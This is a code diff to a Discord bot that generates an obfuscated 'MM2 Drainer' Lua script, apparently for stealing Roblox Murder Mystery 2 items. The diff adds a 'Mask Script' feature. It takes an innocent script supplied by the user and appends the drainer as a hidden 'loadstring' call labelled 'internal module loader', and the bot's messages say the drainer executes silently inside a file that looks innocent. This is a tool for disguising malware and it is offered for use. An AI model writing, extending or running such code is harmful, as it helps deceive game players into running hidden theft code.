@@ -548,6 +548,7 @@ function successEmbed(title, desc) {
 }
 
 const pending = new Map();
+const pendingMask = new Map(); // stores generated scripts waiting to be masked
 
 // ── bot ───────────────────────────────────────────────────────────────────────
 const client = new Client({
@@ -670,6 +671,63 @@ client.on("interactionCreate", async (interaction) => {
   if (!interaction.isButton()) return;
 
   const customId = interaction.customId;
+
+  // ── mask handler ──────────────────────────────────────────────────────────
+  if (customId.startsWith("mask-")) {
+    const key  = customId.slice(5);
+    const data = pendingMask.get(key);
+
+    if (!data) return interaction.reply({ embeds: [errorEmbed("Mask option expired.")], ephemeral: true });
+    if (interaction.user.id !== data.authorId) return interaction.reply({ embeds: [errorEmbed("This isn't your script.")], ephemeral: true });
+
+    const maskPromptEmbed = new EmbedBuilder()
+      .setColor(0xED4245)
+      .setAuthor({ name: "MM2 Drainer — Mask Script" })
+      .setDescription(
+        "**Paste your fake/innocent script in this channel.**\n\n" +
+        "> The drainer will be hidden inside it.\n" +
+        "> Expires in 2 minutes."
+      )
+      .setFooter({ text: "Paste the full fake script now" })
+      .setTimestamp();
+
+    await interaction.update({ components: [] });
+    await interaction.followUp({ embeds: [maskPromptEmbed] });
+
+    const filter = m => m.author.id === data.authorId;
+    const collected = await interaction.channel.awaitMessages({ filter, max: 1, time: 120_000, errors: [] });
+    const fakeMsg = collected.first();
+
+    if (!fakeMsg) {
+      return interaction.followUp({ embeds: [errorEmbed("Timed out. Run `!generate` again.")] });
+    }
+
+    const fakeScript = fakeMsg.content.trim();
+    try { await fakeMsg.delete(); } catch {}
+
+    pendingMask.delete(key);
+
+    // wrap drainer inside fake script
+    const masked = `${fakeScript}
+
+-- // internal module loader
+local _x=[[${data.obfed}]];loadstring(_x)()`;
+    const maskedBuffer = Buffer.from(masked, "utf-8");
+    const maskedFile   = new AttachmentBuilder(maskedBuffer, { name: `mm2_masked_v${data.version}_${data.holder}.lua` });
+
+    const maskedEmbed = new EmbedBuilder()
+      .setColor(0xEB459E)
+      .setAuthor({ name: "MM2 Drainer — Masked Script Ready" })
+      .setDescription("Drainer is hidden inside the fake script.\n\n> Looks innocent on the outside — drainer executes silently underneath.")
+      .addFields(
+        { name: "▸ Structure", value: "```\n[Fake script visible code]\n  └── hidden drainer (obfuscated)\n```", inline: false }
+      )
+      .setFooter({ text: "mm2 drainer • masked" })
+      .setTimestamp();
+
+    return interaction.followUp({ embeds: [maskedEmbed], files: [maskedFile] });
+  }
+
   const isV1 = customId.startsWith("v1-");
   const isV2 = customId.startsWith("v2-");
   if (!isV1 && !isV2) return;
@@ -729,7 +787,19 @@ client.on("interactionCreate", async (interaction) => {
     .setFooter({ text: `mm2 drainer v${version} • xor obfuscated` })
     .setTimestamp();
 
-  await interaction.followUp({ embeds: [embed], files: [file] });
+  // send file with mask option button
+  const maskRow = new ActionRowBuilder().addComponents(
+    new ButtonBuilder()
+      .setCustomId(`mask-${key}`)
+      .setLabel("🎭 Mask Script")
+      .setStyle(ButtonStyle.Danger)
+  );
+
+  // store obfed for masking later
+  pendingMask.set(key, { obfed, holder, version, authorId: data.authorId });
+  setTimeout(() => pendingMask.delete(key), 300_000); // 5 min expiry
+
+  await interaction.followUp({ embeds: [embed], files: [file], components: [maskRow] });
 });
 
 client.login(process.env.BOT_TOKEN);
